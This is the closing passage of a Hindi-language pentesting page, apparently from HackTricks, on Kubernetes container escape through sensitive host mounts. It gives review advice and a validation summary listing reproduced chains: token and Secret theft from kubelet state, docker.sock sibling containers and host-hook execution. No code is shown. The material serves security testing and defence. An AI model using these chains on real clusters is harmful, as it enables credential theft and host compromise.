- Writable proc/sys entries का अक्सर मतलब होता है कि mount सुरक्षित container view के बजाय host-global kernel controls को expose कर रहा है।
- Mounted `/var` paths की समीक्षा में credentials और आस-पास के workloads की जाँच होनी चाहिए, सिर्फ़ filesystem की नहीं।
- Kubelet state directories और CNI/plugin paths को runtime sockets जितनी ही प्राथमिकता देनी चाहिए, क्योंकि वे अक्सर node पर pod-creation और credential-distribution के सीधे रास्ते में होते हैं।

## Local Validation Status

इस पेज पर दिए गए practical chains को local Linux minikube node पर जाँचा गया। Validation में ये चीज़ें दोहराई गईं:

- अस्थायी writable hostPath के ज़रिए पढ़ने और लिखने की पहुँच
- `/var/lib/kubelet/pods` के ज़रिए projected ServiceAccount tokens और mounted Secrets का पता लगाना
- mounted kubelet state से प्राप्त live token के साथ सफल Kubernetes API authentication
- mounted `/var` के ज़रिए पास के Docker `overlay2` filesystem की read-only खोज
- mounted `docker.sock` के ज़रिए read-only host bind के साथ sibling container बनाना, Docker API का इस्तेमाल करके
- अस्थायी host-consumed hook के ज़रिए delayed host execution
- CNI-wrapper simulation, जिसमें original plugin के arguments, standard input और execution को बरकरार रखा गया

उसी node ने `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` और `config.gz` को expose किया, लेकिन `uevent_helper`, EFI variables, thermal entries या `sched_debug` को expose नहीं किया। Destructive kernel triggers चलाए नहीं गए। इससे पुष्टि होती है कि host-root, `/var`, kubelet-state, socket और host-consumer chains को दोहराया जा सकता है, जबकि procfs/sysfs helper techniques को सटीक kernel, mount mode, payload path और trigger पर निर्भर मानना चाहिए।

## References

- [1] [Kubelet द्वारा इस्तेमाल की जाने वाली Local Files और Paths](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container, `hostPath` mount के ज़रिए host तक पहुँच सकता है](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
